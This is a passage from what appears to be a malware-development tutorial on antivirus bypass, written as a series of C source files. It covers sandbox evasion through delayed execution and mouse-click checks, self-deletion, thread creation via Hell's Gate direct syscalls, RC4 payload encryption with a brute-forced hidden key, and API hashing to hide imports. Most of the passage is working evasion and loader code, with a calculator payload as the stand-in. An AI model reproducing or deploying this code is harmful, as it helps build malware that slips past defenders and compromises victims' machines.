		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] SetFileInformationByHandle [D] Failed With Error : %d \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"[+] DONE \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">CloseHandle</span><span class="token punctuation">(</span>hFile<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//--------------------------------------------------------------------------------------------------------------------------</span>

	<span class="token comment">// Freeing the allocated buffer</span>
	<span class="token function">HeapFree</span><span class="token punctuation">(</span><span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> pRename<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>



<span class="token keyword">typedef</span> <span class="token function">NTSTATUS</span><span class="token punctuation">(</span>NTAPI<span class="token operator">*</span> fnNtDelayExecution<span class="token punctuation">)</span><span class="token punctuation">(</span>
	BOOLEAN              Alertable<span class="token punctuation">,</span>
	PLARGE_INTEGER       DelayInterval
	<span class="token punctuation">)</span><span class="token punctuation">;</span>

BOOL <span class="token function">DelayExecutionVia_NtDE</span><span class="token punctuation">(</span>FLOAT ftMinutes<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	<span class="token comment">// Converting minutes to milliseconds</span>
	DWORD                   dwMilliSeconds         <span class="token operator">=</span> ftMinutes <span class="token operator">*</span> <span class="token number">60000</span><span class="token punctuation">;</span>
	LARGE_INTEGER           DelayInterval          <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
	LONGLONG                Delay                  <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	NTSTATUS                STATUS                 <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	fnNtDelayExecution      pNtDelayExecution      <span class="token operator">=</span> <span class="token punctuation">(</span>fnNtDelayExecution<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandle</span><span class="token punctuation">(</span>L<span class="token string">"NTDLL.DLL"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"NtDelayExecution"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	DWORD                   _T0                    <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>
	                        _T1                    <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] Delaying Execution Using \"NtDelayExecution\" For %0.3d Seconds"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>dwMilliSeconds <span class="token operator">/</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Converting from milliseconds to the 100-nanosecond - negative time interval</span>
	Delay <span class="token operator">=</span> dwMilliSeconds <span class="token operator">*</span> <span class="token number">10000</span><span class="token punctuation">;</span>
	DelayInterval<span class="token punctuation">.</span>QuadPart <span class="token operator">=</span> <span class="token operator">-</span>Delay<span class="token punctuation">;</span>

	_T0 <span class="token operator">=</span> <span class="token function">GetTickCount64</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Sleeping for 'dwMilliSeconds' ms </span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">pNtDelayExecution</span><span class="token punctuation">(</span>FALSE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>DelayInterval<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0x00</span> <span class="token operator">&amp;&amp;</span> STATUS <span class="token operator">!=</span> STATUS_TIMEOUT<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] NtDelayExecution Failed With Error : 0x%0.8X \n"</span><span class="token punctuation">,</span> STATUS<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	_T1 <span class="token operator">=</span> <span class="token function">GetTickCount64</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Slept for at least 'dwMilliSeconds' ms, then 'DelayExecutionVia_NtDE' succeeded, otherwize it failed</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span><span class="token punctuation">(</span>_T1 <span class="token operator">-</span> _T0<span class="token punctuation">)</span> <span class="token operator">&lt;</span> dwMilliSeconds<span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\t&gt;&gt; _T1 - _T0 = %d \n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span><span class="token punctuation">(</span>_T1 <span class="token operator">-</span> _T0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] DONE \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h4 id="toc-heading-13">AntiAnalysis Helper Function</h4>
<p>Create a new function, <code>AntiAnalysis</code>, to efficiently call the above functions. To use the <code>AntiAnalysis</code> function, an external variable, <code>g_Sys</code>, is required. <code>g_Sys</code> is a <code>VX_TABLE</code> structure that contains the data necessary to use syscalls in the program.</p>
<p>Brief points about the <code>AntiAnalysis</code> function:</p>
<ul>
<li>
<p>It takes <code>dwMilliSeconds</code> as an input parameter which represents the amount of time to monitor for mouse clicks.</p>
</li>
<li>
<p>This function begins by calling <code>DeleteSelf</code> to delete the file from the disk.</p>
</li>
<li>
<p>A while loop is then initiated, which runs the <code>MouseClicksLogger</code> through a new thread and waits for it for a period specified by <code>dwMilliSeconds</code>.</p>
</li>
<li>
<p>Once the thread time is up, the hooks installed will be removed and 
the execution of the program will be delayed for half the value of the <code>i</code> variable; where <code>i</code> represent the value to delay execution for in minutes.</p>
</li>
<li>
<p>The function then checks the total number of mouse clicks before the 
delay. If it is less than 5, the global mouse click monitor variable, <code>g_dwMouseClicks</code>, is reset so the next loop will start the mouse click test from the beginning.</p>
</li>
<li>
<p>Incrementing the variable <code>i</code> forces the subsequent <code>DelayExecutionVia_NtDE</code> function to wait for a longer duration, creating a way of delaying execution in a sandbox.</p>
</li>
</ul>
<p><strong>AntiAnalysis.c</strong></p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token comment">// using the 'extern' keyword, because this variable is already defined in the 'Inject.c' file</span>
<span class="token keyword">extern</span> VX_TABLE g_Sys<span class="token punctuation">;</span>

<span class="token comment">//...</span>

BOOL <span class="token function">AntiAnalysis</span><span class="token punctuation">(</span>DWORD dwMilliSeconds<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	HANDLE					hThread			<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	NTSTATUS				STATUS			<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	LARGE_INTEGER			DelayInterval	<span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
	FLOAT					i			    <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
	LONGLONG				Delay			<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	Delay <span class="token operator">=</span> dwMilliSeconds <span class="token operator">*</span> <span class="token number">10000</span><span class="token punctuation">;</span>
	DelayInterval<span class="token punctuation">.</span>QuadPart <span class="token operator">=</span> <span class="token operator">-</span>Delay<span class="token punctuation">;</span>

	<span class="token comment">// Self-deletion </span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">DeleteSelf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token comment">// we dont care for the result - but you can change this if you want</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Try 10 times, after that return FALSE</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>


		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[#] Monitoring Mouse-Clicks For %d Seconds - Need 6 Clicks To Pass\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>dwMilliSeconds <span class="token operator">/</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">// Creating a thread that runs 'MouseClicksLogger' function</span>
		<span class="token function">HellsGate</span><span class="token punctuation">(</span>g_Sys<span class="token punctuation">.</span>NtCreateThreadEx<span class="token punctuation">.</span>wSystemCall<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">HellDescent</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hThread<span class="token punctuation">,</span> THREAD_ALL_ACCESS<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> MouseClicksLogger<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n"</span><span class="token punctuation">,</span> STATUS<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token comment">// Waiting for the thread for 'dwMilliSeconds'</span>
		<span class="token function">HellsGate</span><span class="token punctuation">(</span>g_Sys<span class="token punctuation">.</span>NtWaitForSingleObject<span class="token punctuation">.</span>wSystemCall<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">HellDescent</span><span class="token punctuation">(</span>hThread<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>DelayInterval<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> STATUS <span class="token operator">!=</span> STATUS_TIMEOUT<span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n"</span><span class="token punctuation">,</span> STATUS<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token function">HellsGate</span><span class="token punctuation">(</span>g_Sys<span class="token punctuation">.</span>NtClose<span class="token punctuation">.</span>wSystemCall<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">HellDescent</span><span class="token punctuation">(</span>hThread<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] NtClose Failed With Error : 0x%0.8X \n"</span><span class="token punctuation">,</span> STATUS<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token comment">// Unhooking </span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>g_hMouseHook <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">UnhookWindowsHookEx</span><span class="token punctuation">(</span>g_hMouseHook<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] UnhookWindowsHookEx Failed With Error : %d \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token comment">// Delaying execution for specific amount of time</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">DelayExecutionVia_NtDE</span><span class="token punctuation">(</span><span class="token punctuation">(</span>FLOAT<span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

		<span class="token comment">// If the user clicked more than 5 times, we return true</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>g_dwMouseClicks <span class="token operator">&gt;</span> <span class="token number">5</span><span class="token punctuation">)</span>
			<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>

		<span class="token comment">// If not, we reset the mouse-clicks variable, and monitor the mouse-clicks again</span>
		g_dwMouseClicks <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

		<span class="token comment">// Increment 'i', so that next time 'DelayExecutionVia_NtDE' will wait longer</span>
		i<span class="token operator">++</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p><code>Common.h</code> must be updated to include the prototype for <code>AntiAnalysis</code> as well as defining <code>NEW_STREAM</code> which is required by the <code>DeleteSelf</code> function.</p>
<p><strong>Common.h</strong></p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token comment">// The new data stream name</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NEW_STREAM</span> <span class="token expression">L</span><span class="token string">":Maldev"</span></span>

BOOL <span class="token function">AntiAnalysis</span><span class="token punctuation">(</span>DWORD dwMilliSeconds<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>The anti-analysis features can be enabled by calling the <code>AntiAnalysis</code> function in <code>main.c</code>, however, this must be done after the <code>InitializeSyscalls</code> function has been called as the <code>AntiAnalysis</code>
 function utilizes direct syscalls which are only available after this 
function has been executed. For testing, the following if-statement is 
added to the main function in <code>main.c</code>.</p>
<p><strong>Main.c</strong></p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">AntiAnalysis</span><span class="token punctuation">(</span><span class="token number">20000</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Detected A Virtualized Environment \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>Where <code>20000</code> represents the time to monitor the mouse clicks in milliseconds.</p>
<h4 id="toc-heading-14">NtDelayExecution Via Hell's Gate</h4>
<p>Hell's Gate can be used to call <code>NtDelayExecution</code>, which requires updating the <code>VX_TABLE</code> structure definition located in <code>Common.h</code> and the <code>InitializeSyscalls</code> function to add the <code>VX_TABLE_ENTRY NtDelayExecution</code> element and initialize it. The <code>Hasher</code> program will also need to be used to calculate the hash for the syscall, as was done in previous steps.</p>
<h3 id="toc-heading-15">Anti-Analysis Results</h3>
<p>The following image shows the output of the <code>AntiAnalysis</code> function at runtime.</p>
<p><img src="81_files/av-bypass-616804411-39794aab-14d5-439c-9f30-2ed26efe8dce.png" alt="image"></p>
<h3 id="toc-heading-16">Payload Encryption</h3>
<p><code>HellShell.exe</code> will be used for payload encryption. The command that will be used is <code>.\HellShell.exe calc.bin rc4</code>, where <code>calc.bin</code> is the raw payload file. The encrypted payload will replace the previous unencrypted payload in the <code>main.c</code> file. Furthermore, the <code>Rc4EncryptionViSystemFunc032</code> function which is responsible for decryption will be saved in the <code>Inject.c</code> file.</p>
<h4 id="toc-heading-17">Brute Force Decryption</h4>
<p><code>HellShell.exe</code> generates the key below.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">char</span> Rc4Key<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0xA0</span><span class="token punctuation">,</span> <span class="token number">0xAA</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0x92</span><span class="token punctuation">,</span> <span class="token number">0x9F</span><span class="token punctuation">,</span> <span class="token number">0xBA</span><span class="token punctuation">,</span> <span class="token number">0x8F</span><span class="token punctuation">,</span> <span class="token number">0xCE</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0xD8</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0xFA</span><span class="token punctuation">,</span> <span class="token number">0xED</span><span class="token punctuation">,</span> <span class="token number">0xB9</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>The key will be encrypted and then decrypted using the brute force 
method. First, the key needs to be encrypted. This will be done via a 
new project that will use the same algorithm as the <code>KeyGuard.exe</code> tool. The only difference is that the key is not randomly generated since <code>HellShell.exe</code> already generated one(<code>Rc4Key</code>). This new project is shared in this module's code and is named <code>KeyGuard2</code>.</p>
<p><img src="81_files/av-bypass-716812124-de717043-aa23-40c9-8058-f0ae0c06f407.png" alt="image"></p>
<p>The <code>Rc4EncryptionViSystemFunc032</code> function will be updated to include the brute forcing logic. The function will be called by <code>RemoteMappingInjectionViaSyscalls</code>.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOL <span class="token function">Rc4EncryptionViSystemFunc032</span><span class="token punctuation">(</span>IN PBYTE pRc4Key<span class="token punctuation">,</span> IN PBYTE pPayloadData<span class="token punctuation">,</span> IN DWORD dwRc4KeySize<span class="token punctuation">,</span> IN DWORD sPayloadSize<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	<span class="token comment">// The return of SystemFunction032</span>
	NTSTATUS        	STATUS				<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	BYTE			RealKey	<span class="token punctuation">[</span>KEY_SIZE<span class="token punctuation">]</span>	<span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span>			    b				    <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

	<span class="token comment">// Brute forcing the key:</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token comment">// Using the hint byte, if this is equal, then we found the 'b' value needed to decrypt the key </span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pRc4Key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^</span> b<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> HINT_BYTE<span class="token punctuation">)</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token comment">// Else, increment 'b' and try again</span>
		<span class="token keyword">else</span>
			b<span class="token operator">++</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] Calculated 'b' to be : 0x%0.2X \n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Decrypting the key</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> KEY_SIZE<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		RealKey<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>BYTE<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pRc4Key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> b<span class="token punctuation">)</span> <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt</span>
	USTRING         Key <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token punctuation">.</span>Buffer <span class="token operator">=</span> RealKey<span class="token punctuation">,</span>              <span class="token punctuation">.</span>Length <span class="token operator">=</span> dwRc4KeySize<span class="token punctuation">,</span>         <span class="token punctuation">.</span>MaximumLength <span class="token operator">=</span> dwRc4KeySize <span class="token punctuation">}</span><span class="token punctuation">,</span>
			        Img <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token punctuation">.</span>Buffer <span class="token operator">=</span> pPayloadData<span class="token punctuation">,</span>         <span class="token punctuation">.</span>Length <span class="token operator">=</span> sPayloadSize<span class="token punctuation">,</span>         <span class="token punctuation">.</span>MaximumLength <span class="token operator">=</span> sPayloadSize <span class="token punctuation">}</span><span class="token punctuation">;</span>


	<span class="token comment">// Since SystemFunction032 is exported from Advapi32.dll, we load it Advapi32 into the prcess,</span>
	<span class="token comment">// And using its return as the hModule parameter in GetProcAddress</span>
	fnSystemFunction032 SystemFunction032 <span class="token operator">=</span> <span class="token punctuation">(</span>fnSystemFunction032<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">LoadLibraryA</span><span class="token punctuation">(</span><span class="token string">"Advapi32"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"SystemFunction032"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// If SystemFunction032 calls failed it will return non zero value</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">SystemFunction032</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Img<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] SystemFunction032 FAILED With Error : 0x%0.8X\n"</span><span class="token punctuation">,</span> STATUS<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3 id="toc-heading-18">Brute Force Decryption Results</h3>
<p>Executing the payload (Anti analysis features are disabled).</p>
<p><img src="81_files/av-bypass-816812885-3a8e28cd-22cb-42f0-9673-9d58ea2471da.png" alt="image"></p>
<h3 id="toc-heading-19">API Hashing</h3>
<p>So far, all the WinAPIs used have been called directly, which means 
they can be found in the IAT of the implementation. To resolve this, a 
new file, <code>ApiHashing.c</code>, is created which contains the necessary functions for implementing API hashing.</p>
<p><strong>ApiHashing.c</strong></p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h&gt;</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"Structs.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"Common.h"</span></span>

FARPROC <span class="token function">GetProcAddressH</span><span class="token punctuation">(</span>HMODULE hModule<span class="token punctuation">,</span> DWORD dwApiNameHash<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>hModule <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> dwApiNameHash <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	PBYTE pBase <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>hModule<span class="token punctuation">;</span>

	PIMAGE_DOS_HEADER       pImgDosHdr       <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>pBase<span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>pImgDosHdr<span class="token operator">-&gt;</span>e_magic <span class="token operator">!=</span> IMAGE_DOS_SIGNATURE<span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	PIMAGE_NT_HEADERS       pImgNtHdrs       <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> pImgDosHdr<span class="token operator">-&gt;</span>e_lfanew<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>pImgNtHdrs<span class="token operator">-&gt;</span>Signature <span class="token operator">!=</span> IMAGE_NT_SIGNATURE<span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	IMAGE_OPTIONAL_HEADER   ImgOptHdr        <span class="token operator">=</span> pImgNtHdrs<span class="token operator">-&gt;</span>OptionalHeader<span class="token punctuation">;</span>
	PIMAGE_EXPORT_DIRECTORY pImgExportDir    <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_EXPORT_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> ImgOptHdr<span class="token punctuation">.</span>DataDirectory<span class="token punctuation">[</span>IMAGE_DIRECTORY_ENTRY_EXPORT<span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	PDWORD			FunctionNameArray       <span class="token operator">=</span> <span class="token punctuation">(</span>PDWORD<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> pImgExportDir<span class="token operator">-&gt;</span>AddressOfNames<span class="token punctuation">)</span><span class="token punctuation">;</span>
	PDWORD			FunctionAddressArray    <span class="token operator">=</span> <span class="token punctuation">(</span>PDWORD<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> pImgExportDir<span class="token operator">-&gt;</span>AddressOfFunctions<span class="token punctuation">)</span><span class="token punctuation">;</span>
	PWORD			FunctionOrdinalArray    <span class="token operator">=</span> <span class="token punctuation">(</span>PWORD<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> pImgExportDir<span class="token operator">-&gt;</span>AddressOfNameOrdinals<span class="token punctuation">)</span><span class="token punctuation">;</span>

